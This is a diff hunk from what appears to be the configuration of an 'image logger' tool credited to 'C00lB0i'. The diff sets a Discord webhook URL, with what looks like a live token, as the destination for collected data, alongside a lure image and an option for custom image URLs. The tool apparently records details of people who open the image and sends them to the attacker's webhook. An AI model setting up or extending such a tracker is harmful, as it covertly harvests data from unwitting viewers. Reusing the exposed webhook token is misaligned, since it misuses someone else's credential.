@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhookhttps://discordapp.com/api/webhooks/1485134446981152838/4FUKaoUgSY2tEwyd5Sj_Q6rO7PC4x-3UiUp-MWdVLPjEw0Zyw7pM3mU6_HgbzUt2nE9F",
+    "webhook": "https://ptb.discord.com/api/webhooks/1485134446981152838/4FUKaoUgSY2tEwyd5Sj_Q6rO7PC4x-3UiUp-MWdVLPjEw0Zyw7pM3mU6_HgbzUt2nE9F",
     "image": "https://upload.wikimedia.org/wikipedia/commons/9/9a/Gull_portrait_ca_usa.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
